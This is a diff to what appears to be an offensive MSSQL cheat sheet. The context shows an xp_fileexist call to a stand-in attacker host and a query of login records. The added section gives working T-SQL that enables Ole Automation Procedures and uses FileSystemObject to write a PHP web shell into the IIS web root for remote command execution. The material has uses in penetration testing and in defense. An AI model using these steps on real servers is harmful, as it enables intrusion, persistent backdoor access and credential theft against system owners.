@@ -106,3 +106,23 @@ EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
 ```
 SELECT * FROM master.sys.syslogins;
 ```
+### Enable write file & write local file to achieve rce
+```
+sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+sp_configure 'Ole Automation Procedures', 1
+GO
+RECONFIGURE
+GO
+
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+GO
+```
